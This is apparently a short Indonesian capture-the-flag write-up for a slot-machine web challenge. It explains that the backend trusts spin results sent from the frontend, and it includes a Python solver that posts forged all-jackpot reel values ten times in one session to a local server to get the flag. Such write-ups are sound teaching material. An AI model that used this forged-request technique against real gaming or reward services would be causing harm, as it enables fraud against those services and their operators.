# Putar dan Menangkan

1. Spin dilakukan di frontend, lalu hasilnya dikirimkan ke backend.
1. Data yang dikirimkan ke backend dapat dimodifikasi karena tidak ada verifikasi di backend bahwa data dari frontend.
1. Kemudian banyaknya jackpot yang didapat oleh user disimpan dalam sebuah session.
1. Oleh karena itu, kita dapat mengirimkan request pada session yang sama berisikan full diamond sebanyak 10x ke backend untuk mendapatkan flag.

Berikut merupakan solver yang dapat digunakan:
```python
import requests

HOST = "http://localhost:9012"

s = requests.Session()
for i in range(10):
    resp = s.post(f"{HOST}/slot.php", json={"reels": [100, 100, 100]})
    print(resp.content)
```